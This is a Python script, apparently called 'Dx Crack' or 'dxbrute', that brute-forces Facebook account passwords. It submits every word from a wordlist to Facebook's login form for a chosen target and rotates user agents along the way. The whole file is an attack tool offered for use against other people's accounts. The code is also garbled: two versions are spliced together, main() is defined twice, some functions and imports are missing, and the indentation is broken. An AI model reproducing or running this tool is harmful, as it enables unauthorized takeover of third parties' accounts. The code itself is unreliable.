#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import mechanize
import cookielib
import random




email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))


passwordlist = str(raw_input("Enter the wordlist name and path : "))


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("Password does not exist in the wordlist")

	
	
def brute(password):
	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n[+] Password Find = {}".format(password))
			raw_input("ANY KEY to Exit....")
			sys.exit(1)

			
def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

		
#welcome 
def welcome():
	wel = """
        +=========================================+
        |..........   Dx  Crack ..................|
        +-----------------------------------------+
        |            #Author:Daniel Derefaka      | 
        |	          Version 1.0                   |
 	      |        #Contact: +2348166271623         |
        +=========================================+
        |..........   Dx  Crack        ...........|
        +-----------------------------------------+\n\n
"""
	
	
banner = """\033[36;1m
   _____
  | | ?  |  \    /   \\\033[1;97m
  | |    |   \  /
  |____ /    / \
         
     \x1b[1;97m Author   \033[31;1m:  \033[32mDaniel Dere
     \x1b[1;97m Type     \033[31;1m:  \033[32mdxbrute
     \x1b[1;97m Version  \033[31;1m:  \033[32m0.3
     \x1b[1;97m Contact  \033[31;1m:  \033[32mhttps://t.me/DanielDere
     \x1b[1;97m
"""

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        sleep(2.0 / 90)

system("clear")
slowprint(banner)
email = str(raw_input("\033[37;1minput facebook target \033[31;1m: \033[33;1m"))
passwordlist = str(raw_input("\033[37;1minput wordlist \033[31;1m: \033[33;1m"))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
    try:
        global br
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        menu()
        search()
        print("\033[32;1m[\033[31;1m!\033[32;1m]\033[33;1m Password does not exist in the wordlist")
    except mechanize.URLError:
        print("\n\033[32;1m[\033[31;1m!\033[32;1m]\033[33;1m No Connection")
        sleep(2)
        print("\033[32;1m[\033[31;1m!\033[32;1m] \033[31;1mExit\x1b[0m")
        exit()

	total = open(passwordlist,"r")
	total = total.readlines()
	print wel 
	print " [*] Account to crack : {}".format(email)
	print " [*] Loaded :" , len(total), "passwords"
	print " [*] Cracking, please wait ...\n\n"

	
if __name__ == '__main__':
	main() 
